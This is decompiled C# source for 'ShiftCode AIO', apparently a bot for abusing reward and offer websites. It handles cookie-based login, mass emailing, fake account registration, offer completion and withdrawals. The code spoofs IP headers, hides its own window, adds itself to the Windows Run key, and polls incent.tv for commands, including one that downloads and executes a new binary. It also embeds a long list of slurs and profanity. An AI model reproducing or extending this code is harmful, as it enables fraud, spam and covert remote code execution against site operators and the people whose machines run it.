using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using SC_aio.My;

namespace SC_aio;

[DesignerGenerated]
public class aio : Form
{
	private IContainer components;

	[AccessedThroughProperty("scmembert")]
	private TextBox _scmembert;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("mtaf")]
	private Button _mtaf;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("domaint")]
	private TextBox _domaint;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("sbb")]
	private Button _sbb;

	[AccessedThroughProperty("regb")]
	private Button _regb;

	[AccessedThroughProperty("offb")]
	private Button _offb;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("wdb")]
	private Button _wdb;

	[AccessedThroughProperty("ctb")]
	private Button _ctb;

	public bool autocontrolled;

	public double version;

	public Random rand;

	public CookieContainer logincookie;

	public string domain;

	public string scmember;

	public int threads;

	public int pass;

	public string[] firstnames;

	public string[] lastnames;

	public string[] addresses;

	public string[] roads;

	public string[] cities;

	public string[] words;

	public string[] profanity;

	public string[] profanity2;

	public string[] emaildomains;

	public string[] useragents;

	public string sip;

	public int taskid;

	private string taskuser;

	internal virtual TextBox scmembert
	{
		get
		{
			return _scmembert;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_scmembert = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Button mtaf
	{
		get
		{
			return _mtaf;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = mtaf_Click;
			if (_mtaf != null)
			{
				((Control)_mtaf).remove_Click(eventHandler);
			}
			_mtaf = value;
			if (_mtaf != null)
			{
				((Control)_mtaf).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual TextBox domaint
	{
		get
		{
			return _domaint;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_domaint = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button sbb
	{
		get
		{
			return _sbb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = sbb_Click;
			if (_sbb != null)
			{
				((Control)_sbb).remove_Click(eventHandler);
			}
			_sbb = value;
			if (_sbb != null)
			{
				((Control)_sbb).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button regb
	{
		get
		{
			return _regb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_regb != null)
			{
				((Control)_regb).remove_Click(eventHandler);
			}
			_regb = value;
			if (_regb != null)
			{
				((Control)_regb).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button offb
	{
		get
		{
			return _offb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = offb_Click;
			if (_offb != null)
			{
				((Control)_offb).remove_Click(eventHandler);
			}
			_offb = value;
			if (_offb != null)
			{
				((Control)_offb).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Button wdb
	{
		get
		{
			return _wdb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = wd_Click;
			if (_wdb != null)
			{
				((Control)_wdb).remove_Click(eventHandler);
			}
			_wdb = value;
			if (_wdb != null)
			{
				((Control)_wdb).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button ctb
	{
		get
		{
			return _ctb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = ctb_Click;
			if (_ctb != null)
			{
				((Control)_ctb).remove_Click(eventHandler);
			}
			_ctb = value;
			if (_ctb != null)
			{
				((Control)_ctb).add_Click(eventHandler);
			}
		}
	}

	public aio()
	{
		((Control)this).add_GotFocus((EventHandler)aio_GotFocus);
		((Form)this).add_Load((EventHandler)aio_Load);
		autocontrolled = true;
		version = 0.01;
		rand = new Random();
		firstnames = new string[45]
		{
			"John", "Sam", "Jack", "Jamie", "James", "Simon", "Susan", "Paul", "Phillip", "Tracy",
			"Bill", "Jordan", "Tom", "Andrew", "Jill", "Maggie", "Denise", "Michael", "Eric", "Mike",
			"Andy", "Matthew", "Shawn", "Ronald", "Patrick", "Cody", "Francine", "Donald", "Daniel", "Peter",
			"Joseph", "Joe", "Martin", "Richard", "Clive", "Tony", "Anthony", "Brian", "William", "Charles",
			"Lennie", "Lenny", "Sara", "Sarah", "Holly"
		};
		lastnames = new string[31]
		{
			"Smith", "Jackson", "Miller", "Trebilcock", "Saunders", "Miles", "Woods", "Rogers", "Walters", "Scott",
			"Price", "Johnson", "Thomas", "Kelly", "Swanson", "Green", "Wright", "Rosolino", "Day", "Doyle",
			"Pappas", "Perry", "Cooper", "Bell", "Baker", "Wilson", "Lance", "King", "Davis", "Ashton",
			"White"
		};
		addresses = new string[25]
		{
			"Green", "Grove", "Trinity", "Rover", "Crave", "Grain", "Trinity", "Abbey", "Oak", "Maple",
			"Pine", "Hill", "Lake", "Elm", "View", "Church", "Meadow", "Madisonville", "North", "East",
			"South", "West", "Direction", "River", "Pond"
		};
		roads = new string[5] { "Road", "Lane", "Street", "Avenue", "Drive" };
		cities = new string[15]
		{
			"London", "New London", "Wichita", "Manchester", "Liverpool", "Pittsburgh", "Durham", "Hialeah", "Fremont", "Waco",
			"Denton", "Rialto", "Oakland", "Scarland", "Jupie"
		};
		words = new string[133]
		{
			"money", "cash", "gpt", "guy", "coder", "zombie", "gamer", "king", "burger", "munch",
			"music", "sweep", "earn", "top", "sexy", "tree", "ocean", "nature", "troll", "spain",
			"france", "usa", "girl", "boy", "woman", "navy", "marine", "jetski", "basketball", "football",
			"tennis", "solider", "winning", "ftw", "clean", "wild", "pwn", "man", "coltsfan", "rpgfan",
			"carson", "jimbobby", "jump", "pistol", "rocket", "pro", "sports", "token", "pocket", "watch",
			"spider", "worm", "sky", "sea", "echo", "target", "arrow", "go", "fly", "plane",
			"space", "king", "jk", "dude", "phone", "tune", "ghost", "chill", "relax", "berry",
			"apple", "orange", "pear", "jacket", "flow", "rush", "smile", "dance", "free", "mister",
			"mr", "mrs", "dr", "co", "ceo", "lemon", "killer", "brain", "splash", "rap",
			"mc", "minecraft", "mine", "craft", "chop", "clear", "runied", "blue", "red", "yellow",
			"orange", "green", "purple", "rope", "ramp", "rum", "bear", "pong", "ping", "pan",
			"trail", "tramp", "lol", "learn", "lean", "jeans", "joke", "batman", "bat", "wings",
			"death", "spooky", "angel", "monster", "ant", "step", "soft", "hard", "bounce", "spike",
			"lag", "lang", "language"
		};
		profanity = new string[312]
		{
			"ass", "asses", "asshopper", "cock", "coon", "cracker", "cum", "dick", "heeb", "hell",
			"homo", "humping", "jap", "mick", "muff", "paki", "poon", "spic", "tard", "tit",
			"tits", "twat", "vag", "asshat", "asspirate", "assbag", "assbandit", "assbanger", "assbite", "assclown",
			"asscock", "asscracker", "assface", "assfuck", "assfucker", "assgoblin", "asshat", "asshead", "asshole", "assjacker",
			"asslick", "asslicker", "assmonkey", "assmunch", "assmuncher", "assnigger", "asspirate", "assshit", "assshole", "asssucker",
			"asswad", "asswipe", "bastard", "bitch", "bitchass", "bitches", "bitchtits", "bitchy", "blowjob", "blowjob",
			"bollocks", "bollox", "boner", "brotherfucker", "bullshit", "bumblefuck", "buttplug", "buttpirate", "buttfucka", "buttfucker",
			"cameltoe", "carpetmuncher", "choad", "chode", "clit", "clitface", "clitfuck", "clusterfuck", "cockass", "cockbite",
			"cockburger", "cockface", "cockfucker", "cockhead", "cockjockey", "cockknoker", "cockmaster", "cockmongler", "cockmongruel", "cockmonkey",
			"cockmuncher", "cocknose", "cocknugget", "cockshit", "cocksmith", "cocksmoker", "cocksucker", "coochie", "coochy", "cooter",
			"cumbubble", "cumdumpster", "cumguzzler", "cumjockey", "cumslut", "cumtart", "cunnie", "cunnilingus", "cunt", "cuntface",
			"cunthole", "cuntlicker", "cuntrag", "cuntslut", "damn", "deggo", "dickbag", "dickbeaters", "dickface", "dickfuck",
			"dickfucker", "dickhead", "dickhole", "dickjuice", "dickmilk", "dickmonger", "dicks", "dickslap", "dicksucker", "dickwad",
			"dickweasel", "dickweed", "dickwod", "dike", "dildo", "dipshit", "doochbag", "dookie", "douche", "douchefag",
			"douchebag", "douchewaffle", "dumass", "dumbass", "dumbass", "dumbfuck", "dumbshit", "dumshit", "dyke", "fag",
			"fagbag", "fagfucker", "faggit", "faggot", "faggotcock", "fagtard", "fatass", "fellatio", "feltch", "flamer",
			"fuck", "fuckass", "fuckbag", "fuckboy", "fuckbrain", "fuckbutt", "fucked", "fucker", "fuckersucker", "fuckface",
			"fuckhead", "fuckhole", "fuckin", "fucking", "fucknut", "fucknutt", "fuckoff", "fucks", "fuckstick", "fucktard",
			"fuckup", "fuckwad", "fuckwit", "fuckwitt", "fudgepacker", "gay", "gayass", "gaybob", "gaydo", "gayfuck",
			"gayfuckist", "gaylord", "gaytard", "gaywad", "goddamn", "goddamnit", "gooch", "gook", "gringo", "guido",
			"handjob", "hardon", "homodumbshit", "honkey", "jackass", "jerkoff", "jigaboo", "jizz", "junglebunny", "kike",
			"kooch", "kootch", "kunt", "kyke", "lesbian", "lesbo", "lezzie", "mcfagget", "minge", "mothafucka",
			"motherfucker", "motherfucking", "muffdiver", "munging", "negro", "nigga", "nigger", "niggers", "niglet", "nutsack",
			"nutsack", "panooch", "pecker", "peckerhead", "penis", "penisfucker", "penispuffer", "piss", "pissed", "pissedoff",
			"pissflaps", "polesmoker", "pollock", "poonani", "poonany", "poontang", "porchmonkey", "porchmonkey", "prick", "punanny",
			"punta", "pussies", "pussy", "pussylicking", "puto", "queef", "queer", "queerbait", "queerhole", "renob",
			"rimjob", "ruski", "sandnigger", "sandnigger", "schlong", "scrote", "shit", "shitass", "shitbag", "shitbagger",
			"shitbrains", "shitbreath", "shitcunt", "shitdick", "shitface", "shitfaced", "shithead", "shithole", "shithouse", "shitspitter",
			"shitstain", "shitter", "shittiest", "shitting", "shitty", "shiz", "shiznit", "skank", "skeet", "skullfuck",
			"slut", "slutbag", "smeg", "snatch", "spick", "splooge", "testicle", "thundercunt", "titfuck", "tittyfuck",
			"twatlips", "twats", "twatwaffle", "unclefucker", "vajj", "vagina", "vjayjay", "wank", "wetback", "whore",
			"whorebag", "whoreface"
		};
		profanity2 = new string[5] { "BlTCH", "SHlT", "C0CK", "DlCK", "rainbow kiss" };
		emaildomains = new string[8] { "yahoo.com", "hotmail.com", "gmail.com", "googlemail.com", "mail.com", "gmx.com", "easy.com", "hustmail.com" };
		useragents = new string[13]
		{
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17", "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15", "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13", "Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1", "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1", "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1", "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10", "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02", "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00", "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0"
		};
		sip = "";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		components = new Container();
		scmembert = new TextBox();
		Label1 = new Label();
		mtaf = new Button();
		Label2 = new Label();
		domaint = new TextBox();
		Button1 = new Button();
		sbb = new Button();
		regb = new Button();
		offb = new Button();
		Timer1 = new Timer(components);
		wdb = new Button();
		ctb = new Button();
		((Control)this).SuspendLayout();
		TextBox obj = scmembert;
		Point location = new Point(78, 29);
		((Control)obj).set_Location(location);
		((Control)scmembert).set_Name("scmembert");
		TextBox obj2 = scmembert;
		Size size = new Size(189, 20);
		((Control)obj2).set_Size(size);
		((Control)scmembert).set_TabIndex(2);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(7, 32);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(65, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("SC_Member");
		((Control)mtaf).set_Enabled(false);
		Button obj3 = mtaf;
		location = new Point(10, 84);
		((Control)obj3).set_Location(location);
		((Control)mtaf).set_Name("mtaf");
		Button obj4 = mtaf;
		size = new Size(257, 23);
		((Control)obj4).set_Size(size);
		((Control)mtaf).set_TabIndex(4);
		((ButtonBase)mtaf).set_Text("Mass Tell a Friend (Mass Emailer)");
		((ButtonBase)mtaf).set_UseVisualStyleBackColor(true);
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(29, 9);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(43, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(0);
		Label2.set_Text("Domain");
		TextBox obj5 = domaint;
		location = new Point(78, 6);
		((Control)obj5).set_Location(location);
		((Control)domaint).set_Name("domaint");
		TextBox obj6 = domaint;
		size = new Size(189, 20);
		((Control)obj6).set_Size(size);
		((Control)domaint).set_TabIndex(1);
		Button button = Button1;
		location = new Point(10, 55);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(257, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(3);
		((ButtonBase)Button1).set_Text("Authenticate");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)sbb).set_Enabled(false);
		Button obj7 = sbb;
		location = new Point(10, 113);
		((Control)obj7).set_Location(location);
		((Control)sbb).set_Name("sbb");
		Button obj8 = sbb;
		size = new Size(257, 23);
		((Control)obj8).set_Size(size);
		((Control)sbb).set_TabIndex(5);
		((ButtonBase)sbb).set_Text("Shoutbox");
		((ButtonBase)sbb).set_UseVisualStyleBackColor(true);
		((Control)regb).set_Enabled(false);
		Button obj9 = regb;
		location = new Point(10, 142);
		((Control)obj9).set_Location(location);
		((Control)regb).set_Name("regb");
		Button obj10 = regb;
		size = new Size(257, 23);
		((Control)obj10).set_Size(size);
		((Control)regb).set_TabIndex(6);
		((ButtonBase)regb).set_Text("Registration");
		((ButtonBase)regb).set_UseVisualStyleBackColor(true);
		((Control)offb).set_Enabled(false);
		Button obj11 = offb;
		location = new Point(10, 171);
		((Control)obj11).set_Location(location);
		((Control)offb).set_Name("offb");
		Button obj12 = offb;
		size = new Size(257, 23);
		((Control)obj12).set_Size(size);
		((Control)offb).set_TabIndex(7);
		((ButtonBase)offb).set_Text("Complete Offers");
		((ButtonBase)offb).set_UseVisualStyleBackColor(true);
		Timer1.set_Interval(1);
		((Control)wdb).set_Enabled(false);
		Button obj13 = wdb;
		location = new Point(10, 200);
		((Control)obj13).set_Location(location);
		((Control)wdb).set_Name("wdb");
		Button obj14 = wdb;
		size = new Size(257, 23);
		((Control)obj14).set_Size(size);
		((Control)wdb).set_TabIndex(7);
		((ButtonBase)wdb).set_Text("Withdraw");
		((ButtonBase)wdb).set_UseVisualStyleBackColor(true);
		((Control)ctb).set_Enabled(false);
		Button obj15 = ctb;
		location = new Point(10, 229);
		((Control)obj15).set_Location(location);
		((Control)ctb).set_Name("ctb");
		Button obj16 = ctb;
		size = new Size(257, 23);
		((Control)obj16).set_Size(size);
		((Control)ctb).set_TabIndex(7);
		((ButtonBase)ctb).set_Text("Contests");
		((ButtonBase)ctb).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(279, 258);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ctb);
		((Control)this).get_Controls().Add((Control)(object)wdb);
		((Control)this).get_Controls().Add((Control)(object)offb);
		((Control)this).get_Controls().Add((Control)(object)regb);
		((Control)this).get_Controls().Add((Control)(object)sbb);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)domaint);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)mtaf);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)scmembert);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("aio");
		((Form)this).set_Text("ShiftCode AIO");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public string randSelect(string[] list)
	{
		return list[rand.Next(0, list.Length)];
	}

	public static void AddStartup(string Name, string Path)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(Name, Path, RegistryValueKind.String);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object ReadKey(string Name)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			return registryKey.GetValue(Name);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void RemoveKey(string Name)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.DeleteValue(Name);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object randLetters(object min, object max)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		StringBuilder stringBuilder = new StringBuilder();
		int num = rand.Next(Conversions.ToInteger(min), Conversions.ToInteger(max));
		for (int i = 1; i <= num; i = checked(i + 1))
		{
			int startIndex = rand.Next(0, 25);
			if (rand.Next(0, 2) == 1)
			{
				stringBuilder.Append(text.Substring(startIndex, 1).ToLower());
			}
			else
			{
				stringBuilder.Append(text.Substring(startIndex, 1));
			}
		}
		return stringBuilder.ToString();
	}

	public void spoofip()
	{
		sip = rand.Next(1, 255) + "." + rand.Next(1, 255) + "." + rand.Next(1, 255) + "." + rand.Next(1, 255);
	}

	public void stealth()
	{
		((Control)this).Hide();
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_Text(Conversions.ToString(randLetters(1, 15)));
	}

	public bool signuptosite(string username)
	{
		string text = Conversions.ToString(sendPost("http://incent.tv/signup.php", "s=" + taskid + "&u=" + username));
		if (Operators.CompareString(text, "success", false) == 0)
		{
			return true;
		}
		return false;
	}

	public bool reporterror(string errormsg)
	{
		string text = Conversions.ToString(sendPost("http://incent.tv/error.php", "s=" + taskid + "&e=" + errormsg));
		if (Operators.CompareString(text, "success", false) == 0)
		{
			return true;
		}
		return false;
	}

	public bool updatesite(string withdraw, string offercontest, string referralcontest, string clickcontest, string jackpot)
	{
		string text = Conversions.ToString(sendPost("http://incent.tv/do.php", "s=" + taskid + "&w=" + withdraw + "&o=" + offercontest + "&r=" + referralcontest + "&p=" + clickcontest + "&j=" + jackpot));
		if (Operators.CompareString(text, "success", false) == 0)
		{
			return true;
		}
		return false;
	}

	private bool docommand()
	{
		try
		{
			string text = getcommands();
			string[] array = text.Split(new char[1] { '|' });
			if (Operators.CompareString(array[0], "signup", false) == 0)
			{
				taskid = Conversions.ToInteger(array[1]);
				domaint.set_Text(array[2]);
				Button1.PerformClick();
				string text2 = MyProject.Forms.reg.register(array[2], array[3]);
				if (text2.Contains("Success"))
				{
					taskid = 0;
					return true;
				}
				reporterror(text2);
			}
			else if (Operators.CompareString(array[0], "updatesite", false) == 0)
			{
				taskid = Conversions.ToInteger(array[1]);
				domaint.set_Text(array[2]);
				taskuser = array[3];
				scmembert.set_Text(taskuser + "%3A12f2011d1a78cb2376c55f573362fb2b");
				Button1.PerformClick();
				string text3 = Conversions.ToString(MyProject.Forms.ct.getContest("click", str: true));
				string text4 = Conversions.ToString(MyProject.Forms.ct.getContest("referral", str: true));
				string text5 = Conversions.ToString(MyProject.Forms.ct.getContest("offer", str: true));
				string text6 = Conversions.ToString(MyProject.Forms.ct.getJackpot(str: true));
				string text7 = Conversions.ToString(MyProject.Forms.wd.getWithdrawOptions(str: true));
				if ((text7.Length == 0) & (text5.Length == 0) & (text6.Length == 0) & (text4.Length == 0) & (text3.Length == 0))
				{
					reporterror("Unable to update site!");
				}
				if (updatesite(text7, text5, text4, text3, text6))
				{
					taskid = 0;
					return true;
				}
			}
			else if (Operators.CompareString(array[0], "update", false) == 0)
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("http://incent.tv/" + array[1], ((Form)this).get_Text() + ".exe");
				AddStartup("whereitwas", Application.get_ExecutablePath());
				RemoveKey("win32 service");
				Process.Start(((Form)this).get_Text() + ".exe");
				((Form)this).Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		taskid = 0;
		return false;
	}

	private string getcommands()
	{
		return Conversions.ToString(sendPost("http://incent.tv/get.php", "v=" + version));
	}

	public object sendPost(string url, string postData)
	{
		try
		{
			CookieContainer cookieContainer = new CookieContainer();
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			byte[] bytes = uTF8Encoding.GetBytes(postData);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			httpWebRequest.Method = "POST";
			httpWebRequest.KeepAlive = true;
			httpWebRequest.Timeout = 30000;
			httpWebRequest.CookieContainer = logincookie;
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			if (autocontrolled)
			{
				httpWebRequest.Referer = "http://www.incent.tv/";
			}
			else
			{
				httpWebRequest.Referer = "";
			}
			httpWebRequest.UserAgent = randSelect(useragents);
			httpWebRequest.ContentLength = bytes.Length;
			httpWebRequest.CookieContainer = logincookie;
			if (sip.Length > 0)
			{
				httpWebRequest.Headers.Add("IP: " + sip);
				httpWebRequest.Headers.Add("NginxIP: " + sip);
				httpWebRequest.Headers.Add("HTTP_REMOTE_ADDR: " + sip);
				httpWebRequest.Headers.Add("REMOTE_ADDR: " + sip);
				httpWebRequest.Headers.Add("X-Real-IP: " + sip);
				httpWebRequest.Headers.Add("X-Forwarded-For: " + sip);
				httpWebRequest.Headers.Add("X-Varnish: " + sip);
				httpWebRequest.Headers.Add("Real-IP: " + sip);
				httpWebRequest.Headers.Add("Forwarded-For: " + sip);
				httpWebRequest.Headers.Add("Varnish: " + sip);
				httpWebRequest.Headers.Add("Real_IP: " + sip);
				httpWebRequest.Headers.Add("Forwarded_For: " + sip);
				httpWebRequest.Headers.Add("X_Real_IP: " + sip);
				httpWebRequest.Headers.Add("X_Forwarded_For: " + sip);
				httpWebRequest.Headers.Add("X_Varnish: " + sip);
			}
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			cookieContainer.Add(httpWebResponse.Cookies);
			if ((scmembert.get_Text().Length == 0) | (MyProject.Forms.sb.shoutbox.get_Text().Length == 0))
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = httpWebResponse.Cookies.GetEnumerator();
					while (enumerator.MoveNext())
					{
						Cookie cookie = (Cookie)enumerator.Current;
						if ((Operators.CompareString(cookie.Name, "SC_member", false) == 0) & (scmembert.get_Text().Length == 0))
						{
							scmembert.set_Text(cookie.Value);
							Button1.PerformClick();
						}
						else if ((Operators.CompareString(cookie.Name, "shoutbox", false) == 0) & (MyProject.Forms.sb.shoutbox.get_Text().Length == 0))
						{
							MyProject.Forms.sb.shoutbox.set_Text(cookie.Value);
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			if (url.Contains(domain))
			{
				CookieCollection cookies = httpWebResponse.Cookies;
				logincookie.Add(cookies);
			}
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			return streamReader.ReadToEnd();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			if (autocontrolled)
			{
				reporterror("Unable to reach site, site down or ISP blocked.");
			}
			ProjectData.ClearProjectError();
		}
		return "error";
	}

	private void mtaf_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.masstell).Show();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			logincookie = new CookieContainer();
			Cookie cookie = new Cookie();
			cookie.Domain = "." + domaint.get_Text();
			cookie.Path = "/";
			cookie.Name = "SC_member";
			cookie.Value = scmembert.get_Text();
			logincookie.Add(cookie);
			domain = domaint.get_Text();
			scmember = scmembert.get_Text();
			if (scmembert.get_Text().Length > 0)
			{
				((Control)mtaf).set_Enabled(true);
				((Control)offb).set_Enabled(true);
				((Control)wdb).set_Enabled(true);
				((Control)ctb).set_Enabled(true);
			}
			else
			{
				((Control)mtaf).set_Enabled(false);
				((Control)offb).set_Enabled(false);
				((Control)wdb).set_Enabled(false);
				((Control)ctb).set_Enabled(false);
			}
			((Control)sbb).set_Enabled(true);
			((Control)regb).set_Enabled(true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"Error with the domain submitted.", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void sbb_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.sb).Show();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.reg).Show();
	}

	private void offb_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.co).Show();
	}

	private void aio_GotFocus(object sender, EventArgs e)
	{
		stealth();
	}

